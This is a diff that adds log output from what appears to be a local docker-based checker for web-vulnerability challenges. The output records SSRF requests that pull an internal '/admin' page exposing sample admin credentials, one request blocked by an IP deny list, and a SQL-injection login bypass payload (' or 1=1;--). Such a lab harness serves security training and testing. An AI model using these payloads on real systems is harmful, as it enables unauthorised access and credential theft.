@@ -48,3 +48,115 @@ INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.5:1000/admin , a
   "image": "user: Admin , password: pass1234!"
 }
 INFO:root:result: no
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:59759 on port:1001
+INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.2:1000/admin , answer:, condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: no
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:57956 on port:1001
+INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.2:1000/admin , answer:, condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: no
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:58007 on port:1001
+INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.2:1000/admin , answer:, condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: no
+INFO:root:data length: 46
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:58035 on port:1001
+INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.2:1000/admin , answer:, condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: no
+INFO:root:data length: 
+INFO:root:data length: 46
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:58100 on port:1001
+INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.2:1000/admin , answer:{
+  "image": "user: Admin , password: pass1234!"
+}, condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: yes
+INFO:root:data length: 
+INFO:root:data length: 52
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:58222 on port:1001
+INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.2:1000/admin , answer:{
+  "image": "user: Admin , password: pass1234!"
+}, condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: yes
+INFO:root:data length: 
+INFO:root:data length: 52
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:58301 on port:1001
+INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.2:1000/admin , answer:{
+  "image": "user: Admin , password: pass1234!"
+}, condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: yes
+INFO:root:data length: 
+INFO:root:data length: 52
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:58457 on port:1001
+INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.2:1000/admin , answer:{
+  "image": "user: Admin , password: pass1234!"
+}, condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: yes
+INFO:root:data length: 
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:58488 on port:1001
+INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.5:1000/admin , answer:error: the url isnt allowed, pls enter a domain not from this list:['172.17.0.5'], condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: no
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:58663 on port:1001
+INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.5:1000/admin , answer:error: the url isnt allowed, pls enter a domain not from this list:['172.17.0.5'], condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: no
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:58817 on port:1001
+INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.5:1000/admin , answer:error: the url isnt allowed, pls enter a domain not from this list:['172.17.0.5'], condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: no
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:59073 on port:1001
+INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.5:1000/admin , answer:error: the url isnt allowed, pls enter a domain not from this list:['172.17.0.5'], condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: no
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:59073 on port:1002
+INFO:root:url: http://localhost:1002/, data:url=http://172.17.0.5:1000/admin , answer:HTTPConnectionPool(host='172.17.0.5', port=1000): Max retries exceeded with url: /admin (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7fad7bed6e20>: Failed to establish a new connection: [Errno 113] No route to host')), condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: no
+INFO:root:req: ssrf, parm: none
+INFO:root:opened docker:59129 on port:1001
+INFO:root:url: http://localhost:1001/, data:url=http://172.17.0.2:1000/admin , answer:{
+  "image": "user: Admin , password: pass1234!"
+}, condition:{
+  "image": "user: Admin , password: pass1234!"
+}
+INFO:root:result: yes
+INFO:root:req: sql, parm: logged in successfully!
+INFO:root:opened docker:59142 on port:1002
+INFO:root:url: http://localhost:1002/, data:name=talya&pass=' or 1=1;-- , answer:logged in successfully!, condition:logged in successfully!
+INFO:root:result: yes
+INFO:root:req: sql, parm: logged in successfully!
+INFO:root:opened docker:59142 on port:1003
+INFO:root:url: http://localhost:1003/, data:name=talya&pass=' or 1=1;-- , answer:Error, name or password are not correct!, condition:logged in successfully!
+INFO:root:result: no
